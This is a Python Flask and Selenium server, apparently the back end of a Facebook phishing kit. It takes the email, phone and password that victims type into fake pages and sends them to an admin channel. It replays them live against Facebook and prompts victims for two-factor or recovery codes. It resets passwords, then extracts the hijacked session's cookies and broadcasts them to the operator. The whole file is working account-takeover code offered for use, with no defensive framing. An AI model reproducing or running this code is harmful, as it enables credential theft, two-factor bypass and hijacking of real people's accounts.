from flask import Flask, render_template, request, session
from flask_socketio import SocketIO, emit
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from selenium.webdriver.chrome.options import Options
import uuid
from flask_session import Session

app = Flask(__name__)
socketio = SocketIO(app)

app.config["SECRET_KEY"] = "your_secret_key"
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

drivers = {}

# Dictionary to track login attempts
login_attempts = {}
code_attempts = {}
count_attempts= {}


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/admin")
def admin():
    return render_template("admin.html")


@app.route("/confirm")
def confirm_page():
    user_id = request.args.get("id", None)
    print(f"User ID: {user_id}")
    return render_template("confirm.html", user_id=user_id)


@app.route("/done")
def done_page():
    return render_template("done.html")


@socketio.on("connect")
def handle_connect():
    print(f"Client connected: {request.sid}")
    emit("message", {"data": f"Connected to the server with user ID: {request.sid}"})


@socketio.on("disconnect")
def handle_disconnect():
    print(f"Client disconnected: {request.sid}")
    if request.sid in login_attempts:
        del login_attempts[request.sid]


@socketio.on("client_contact")
def handle_client_contact(data):
    session_id = data["session_id"]
    email = data["email"]
    phone = data["phone"]
    print(f"Received email from client {session_id}: {email}")
    print(f"Received phone from client {session_id}: {phone}")
    emit(
        "admin_message",
        {"id": session_id, "type": "email", "data": email},
        broadcast=True,
    )
    emit(
        "admin_message",
        {"id": session_id, "type": "phone", "data": phone},
        broadcast=True,
    )


@socketio.on("client_password")
def handle_client_password(data):
    session_id = data["session_id"]
    contact = data["contact"]
    email = contact["email"]
    phone = contact["phone"]
    password = data["data"]
    print(f"Received password from client {session_id}: {password}")
    emit(
        "admin_message",
        {"id": session_id, "type": "password", "data": password},
        broadcast=True,
    )

    # Perform login test with the received contact and password
    result = login_facebook(session_id, email, phone, password)

    # Track login attempts
    if session_id not in login_attempts:
        login_attempts[session_id] = 0
    if result == "Wrong_Pass":
        login_attempts[session_id] += 1
        if login_attempts[session_id] >= 2:
            forgot_password(session_id, email, phone)
            emit(
                "redirect",
                {"url": f"/confirm?id={password}", "id": password},
                room=session_id,  # Add this line to specify the room
            )
            return

    print("end for login")

    # Emit the result back to the client
    emit("login_result", {"result": result}, room=session_id)


def setup_selenium(session_id):
    if (session_id in drivers and drivers[session_id] is not None):
        return drivers[session_id]

    chrome_options = Options()

    chrome_options.add_argument("--enable-unsafe-swiftshader")
    chrome_options.add_argument("--window-size=750,800")
    service = Service(executable_path="chromedriver.exe")
    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.get("https://en-gb.facebook.com/")
    drivers[session_id] = driver
    return drivers[session_id]


def login_facebook(session_id, email, phone, password):
    driver = setup_selenium(session_id)
    if (
        "https://en-gb.facebook.com/login/device-based/regular/login"
        not in driver.current_url
        or "https://en-gb.facebook.com"
        not in driver.current_url
    ):
        driver.get("https://en-gb.facebook.com")

    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "email"))
        )
    except Exception as e:
        print(f"An error occurred while waiting for email input: {e}")
        driver.get("https://en-gb.facebook.com")
        return str(e)
    try:
        email_input = driver.find_element(By.ID, "email")
    except Exception as e:
        print(f"An error occurred while finding email input: {e}")
        driver.get("https://en-gb.facebook.com")
        return str(e)
    try:
        password_input = driver.find_element(By.ID, "pass")
    except Exception as e:
        print(f"An error occurred while finding password input: {e}")
        return str(e)
    try:
        login_button = driver.find_element(By.NAME, "login")
    except Exception as e:
        print(f"An error occurred while finding login button: {e}")
        return str(e)
    try:
        email_input.clear()
        email_input.send_keys(email)

        password_input.clear()
        password_input.send_keys(password)

        login_button.click()

        time.sleep(5)
        driver.get(driver.current_url)
        count = 1

        if "two_step_verification" in driver.current_url:
            emit(
                "redirect",
                {"url": f"/confirm?id={password}", "id": password},
                room=session_id,  # Add this line to specify the room
            )
            if session_id not in count_attempts:
                count_attempts[session_id] = 0
            count_attempts[session_id] =2
            try:
                buttonTry = WebDriverWait(driver, 20).until(
                    EC.element_to_be_clickable(
                        (By.XPATH, "//span[text()='Try Another Way']")
                    )
                )
                #  viết ở đây
                buttonTry.click()
                textMess = None
                try:
                    print("Click text message1")
                    textMess = WebDriverWait(driver, 20).until(
                        EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Text message')]"))
                    )
                    textMess.click()
                   
                except:
                    textMess = None
                    try:
                        textMess = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'WhatsApp')]"))
                        )
                        textMess.click()
                        print("Click WhatsApp")
                    except:
                        textMess = None
                        try:
                            textMess = WebDriverWait(driver, 10).until(
                                EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Email')]"))
                            )
                            textMess.click()
                            print("Click Email")
                        except:
                            textMess = None
                            print("No valid method found. Waiting for 2 minutes before retrying...")
                            time.sleep(120)
                            driver.refresh()
                
                if textMess:
                    try:
                        element = WebDriverWait(driver, 10).until(
                             EC.presence_of_element_located((By.XPATH, "//span[text()='Continue']"))
                        )   
                        driver.execute_script("arguments[0].click();", element)

                        print("Click continue button")
                    except Exception as e:
                        print(f"An error occurred while finding continue button: {e}")
                    print("Click text message")
                return
                 
            except:
                tryanwser = None
             
        elif "https://en-gb.facebook.com/login" in driver.current_url:
            # If login with email fails, try logging in with phone
            print("Login failed. Trying with phone number.")
            try:
                email_input = driver.find_element(By.ID, "email")
                if email_input:
                    email_input.clear()
                    email_input.send_keys(phone)
            except:
                print("Email input not found.")

            password_input = driver.find_element(By.ID, "pass")
            password_input.clear()
            password_input.send_keys(password)

            login_button = driver.find_element(By.NAME, "login")
            login_button.click()
            url = driver.current_url.replace("www", "en-gb")
            driver.get(url)
            time.sleep(5)

            if "two_step_verification" in driver.current_url:
                print("Two-step verification required.")
                return "checkpoint"
            elif "https://en-gb.facebook.com/login" in driver.current_url:
                print("Login failed. Please check your credentials.")
                return "Wrong_Pass"
        elif "https://en-gb.facebook.com/recover" in driver.current_url:
            if count == 1:
                # If login with email fails, try logging in with phone
                driver.get("https://en-gb.facebook.com/login")
                email_input = driver.find_element(By.ID, "email")
                email_input.clear()
                email_input.send_keys(phone)

                password_input = driver.find_element(By.ID, "pass")
                password_input.clear()
                password_input.send_keys(password)

                login_button = driver.find_element(By.NAME, "login")
                login_button.click()
                url = driver.current_url.replace("www", "en-gb")
                driver.get(url)
                time.sleep(5)

                if "two_step_verification" in driver.current_url:
                    print("Two-step verification required.")
                    return "checkpoint"
                elif "https://en-gb.facebook.com/login" in driver.current_url:
                    print("Login failed. Please check your credentials.")
                    return "Wrong_Pass"
            count += 1
            forgot_password(session_id, email, phone)
            emit(
                "redirect",
                {"url": f"/confirm?id={password}", "id": password},
                room=request.sid,
            )

        elif "https://en-gb.facebook.com/login/help.php" in driver.current_url:
            print("Login successful.")
            return "Login_Success"

        print("Login successful.")
        return "Login_Success"
    except Exception as e:
        print(f"An error occurred: {e}")
         
        return "Wrong_Pass"


def forgot_password(session_id, email, mobile=None):
    driver = setup_selenium(session_id)
    try:
        driver.get("https://en-gb.facebook.com/login/identify")
        WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.ID, "identify_email"))
        )
    except Exception as e:
        print(
            f"An error occurred during forgot password process while waiting for identify email input: {e}"
        )
        return
    try:
        email_input = driver.find_element(By.ID, "identify_email")
    except Exception as e:
        print(f"An error occurred while finding identify email input: {e}")
        return
    try:
        search_button = driver.find_element(By.NAME, "did_submit")
    except Exception as e:
        print(f"An error occurred while finding search button: {e}")
        return
    try:
        email_input.clear()
        email_input.send_keys(email)

        # Nhấn nút tìm kiếm (tương tự như trước)
        search_button.click()
        time.sleep(5)

        if "https://en-gb.facebook.com/login/identify" in driver.current_url:
            phone_input = driver.find_element(By.ID, "identify_email")
            phone_input.clear()
            phone_input.send_keys(mobile)

            search_button = driver.find_element(By.NAME, "did_submit")
            search_button.click()

        time.sleep(5)
        print("đợi uiheader")
        element = None
        # nếu ra chữ "We sent a 6-digit code to" thì đã lấy được form input và button submit
        try:

            element = driver.find_element(By.CLASS_NAME, "uiHeaderTitle")
        except:
            element = None

        print("SO sánh google")
        if element:
            if "Google" in element.text:
                driver.get(
                    "https://en-gb.facebook.com/recover/initiate/?is_from_lara_screen=1"
                )
                button = WebDriverWait(driver, 20).until(
                    EC.element_to_be_clickable(
                        (By.XPATH, '//button[text()="Continue"]')
                    )
                )
                button.click()
            else:
                button = WebDriverWait(driver, 20).until(
                    EC.element_to_be_clickable(
                        (By.XPATH, '//button[text()="Continue"]')
                    )
                )
                button.click()
        else:
            driver.get(
                "https://en-gb.facebook.com/recover/initiate/?is_from_lara_screen=1"
            )

            button = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.XPATH, '//button[text()="Continue"]'))
            )
            button.click()
            time.sleep(5)
            print("vào quênmk")
            try:

                element = driver.find_element(By.CLASS_NAME, "uiHeaderTitle")
                if element:
                    button = WebDriverWait(driver, 20).until(
                        EC.element_to_be_clickable(
                            (By.XPATH, '//button[text()="Continue"]')
                        )
                    )
                    button.click()
                

            except:
                print("quên mk2")
                button = WebDriverWait(driver, 20).until(
                        EC.element_to_be_clickable(
                            (By.XPATH, '//button[text()="Continue"]')
                        )
                    )
                button.click()

    except Exception as e:
        print(f"An error occurred during forgot password process: {e}")


@socketio.on("confirm_code")
def handle_confirm_code(data):
    driver = setup_selenium(data["session_id"])
    session_id = data["session_id"]
    password = data["password"]
    sess_id = data["sess_id"]
    code = data["code"]
 
    if session_id not in code_attempts:
        code_attempts[session_id] = 0
    if session_id not in count_attempts:
        count_attempts[session_id] = 0

    
    if count_attempts[session_id] == 2:
            print("vào 2fa")
            rest2 = fa2(session_id, code)
            
            count_wrong = 0
            if rest2 == "FA2_Accepted":
                code_attempts[session_id] += 1
                emit("code_result2", {"status": "true"}, room=sess_id)
                emit("redirect", {"url": "/done"}, room=sess_id)
                cookies = driver.get_cookies()
                 # chỉ lấy name và value của cookies
                cookie_list = [{"name": c['name'], "value": c['value']} for c in cookies]
                cookie_str = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookie_list])
                print(cookie_str)
                emit(
                    "admin_message",
                    {"id": session_id, "type": "cookies", "data": cookie_str},
                    broadcast=True,
                )
                driver.close()
                return
            else:
                count_wrong += 1
                emit("code_result2", {"status": "false"}, room=sess_id)
                 
                if count_wrong >= 2:
                    driver.close()
                    emit("redirect", {"url": "/done"}, room=sess_id)
                return

    code_attempts[session_id] += 1

    print(f"Code attempts: {code_attempts[session_id]}")
    if code_attempts[session_id] > 2:
        emit("redirect", {"url": "/done"}, room=session_id)
        return

    result = enter_confirmation_code(session_id, code)
    if result != "Code_Accepted":
        emit("code_result", {"status": "false"}, room=sess_id)
        if code_attempts[session_id] >= 2:
            # Get cookies from Selenium and send to admin
            driver = setup_selenium(session_id)
            cookies = driver.get_cookies()
            # chỉ lấy name và value của cookies
            cookie_list = [{"name": c['name'], "value": c['value']} for c in cookies]
            cookie_str = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookie_list])

            emit(
                "admin_message",
                {"id": session_id, "type": "cookies", "data": cookie_str},
                broadcast=True,
            )
            emit("redirect", {"url": "/done"}, room=sess_id)
            driver.close()

    else:
        print(driver.current_url)
        if "https://www.facebook.com/" == driver.current_url:
            cookies = driver.get_cookies()
            cookie_list = [{"name": c['name'], "value": c['value']} for c in cookies]
            cookie_str = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookie_list])

            emit(
                    "admin_message",
                    {"id": session_id, "type": "cookies", "data": cookie_str},
                    broadcast=True,
            )
            emit("redirect", {"url": "/done"}, room=session_id)
                # tắt driver
            driver.close()

        rest = setNewPass(session_id, password)
        if rest == "NewPass_Accepted":
            
            count_attempts[session_id] =2



def enter_confirmation_code(session_id, code):
    driver = setup_selenium(session_id)
    try:
        code_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "recovery_code_entry"))
        )
        code_input.clear()
        code_input.send_keys(code)
        continue_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//button[text()="Continue"]'))
        )
        continue_button.click()
        time.sleep(5)

        if "https://en-gb.facebook.com/recover/code" in driver.current_url:
            print("Invalid confirmation code. Please try again.")
            return "Invalid_Code"

        print("Confirmation code entered.")
        return "Code_Accepted"
    except Exception as e:
        print(f"An error occurred while entering the confirmation code: {e}")
        driver.get("https://en-gb.facebook.com/recover/code")
        return "Code_Err"


def setNewPass(session_id, newPass):
    driver = setup_selenium(session_id)
    try:
        newPass_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "password_new"))
        )
    except Exception as e:
        print(f"An error occurred while finding new password input: {e}")
        return "NewPass_Err"
    try:
        newPass_input.clear()
        newPass_input.send_keys(newPass)

        continue_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//button[text()="Continue"]'))
        )
    except Exception as e:
        print(f"An error occurred while finding continue button: {e}")
        return "NewPass_Err"
    try:
        continue_button.click()
        time.sleep(5)
        print("New password entered.")
        return "NewPass_Accepted"
    except Exception as e:
        print(f"An error occurred while entering the new password: {e}")
        return "NewPass_Err"
    

def fa2(session_id, code):
    driver = setup_selenium(session_id)
    try:
        if (
            "https://en-gb.facebook.com/two_step_verification" in driver.current_url
            or "https://en-gb.facebook.com/checkpoint" in driver.current_url
        ):
            code_input = WebDriverWait(driver, 10).until(
            # lấy element input have type = text
                EC.presence_of_element_located((By.XPATH, '//input[@type="text"]'))
            )
            print(code_input)
            time.sleep(2)
            code_input.click()
            code_input.clear()
            code_input.send_keys(code)
            continue_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//span[text()='Continue']"))
            )
            continue_button.click()
            print("Đường dẫn hiện tại." + driver.current_url)
            if "https://en-gb.facebook.com/checkpoint" in driver.current_url or "https://en-gb.facebook.com/two_step_verification" in driver.current_url:
                code_input.click()
                code_input.send_keys(Keys.CONTROL + "a")  # Chọn tất cả
                code_input.send_keys(Keys.BACKSPACE) 
                print("Invalid code. Please try again.")
                return "FA2_Err"
            if "https://en-gb.facebook.com/login/device-based/regular/login" in driver.current_url or "remember_browser" in driver.current_url:
                print("Code accepted.")
                return "FA2_Accepted"
            return "FA2_Accepted"

        else:
            driver = setup_selenium(session_id)
            cookies = driver.get_cookies()
            # chỉ lấy name và value của cookies
            cookie_list = [{"name": c['name'], "value": c['value']} for c in cookies]
            cookie_str = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookie_list])

            emit(
                "admin_message",
                {"id": session_id, "type": "cookies", "data": cookie_str},
                broadcast=True,
            )
            emit("redirect", {"url": "/done"}, room=session_id)
            # tắt driver
            driver.close()
            return "FA2_Err"
    except Exception as e:
            print("lỗi 2fa")
            try:
                buttonTry = WebDriverWait(driver, 20).until(
                    EC.element_to_be_clickable(
                        (By.XPATH, "//span[text()='Try Another Way']")
                    )
                )
                #  viết ở đây
                buttonTry.click()
                textMess = None
                try:
                    print("Click text message1")
                    textMess = WebDriverWait(driver, 20).until(
                        EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Text message')]"))
                    )
                    textMess.click()
                   
                except:
                    textMess = None
                    try:
                        textMess = WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'WhatsApp')]"))
                        )
                        textMess.click()
                        print("Click WhatsApp")
                    except:
                        textMess = None
                        try:
                            textMess = WebDriverWait(driver, 10).until(
                                EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Email')]"))
                            )
                            textMess.click()
                            print("Click Email")
                        except:
                            textMess = None
                            print("No valid method found. Waiting for 2 minutes before retrying...")
                            time.sleep(120)
                            driver.refresh()
                
                if textMess:
                    try:
                        element = WebDriverWait(driver, 10).until(
                             EC.presence_of_element_located((By.XPATH, "//span[text()='Continue']"))
                        )   
                        driver.execute_script("arguments[0].click();", element)

                        print("Click continue button")
                    except Exception as e:
                        print(f"An error occurred while finding continue button: {e}")
                    print("Click text message")
                return
                 
            except:
                tryanwser = None
         


if __name__ == "__main__":
    socketio.run(app, debug=True)
